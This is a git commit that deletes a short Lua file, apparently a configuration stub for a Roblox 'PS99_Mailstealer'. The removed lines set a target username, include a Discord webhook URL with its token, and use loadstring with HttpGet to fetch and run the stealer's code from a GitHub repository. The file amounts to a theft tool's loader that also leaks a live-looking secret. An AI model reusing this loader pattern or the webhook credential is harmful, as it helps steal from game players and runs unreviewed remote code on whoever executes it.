2ad74cf674509f2b830dfa2e596f0b1b90c072ad
r3st5rt <totzskie312@gmail.com>
2024-06-08 02:28:33 +0800

    Delete obf_5Qky3K3G28Z0g9Rv8duaY832u8RNdTCsb9f2ktjK88Z1uhQu23274rvaktFN0aM5.lua

--- obf_5Qky3K3G28Z0g9Rv8duaY832u8RNdTCsb9f2ktjK88Z1uhQu23274rvaktFN0aM5.lua
+++
@@ -1,5 +0,0 @@
-Username = "whymyusernameiscuk"
-LoadScreen = true 
-Webhook = "https://discord.com/api/webhooks/1248699817664712820/Euhu6soAD-hG46diQBJUQEy3_vf9sLvLB8qgfOU7kFt8GEOpM7Hfobp2Odn15318bmpY" -- Paste your Discord webhook here
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
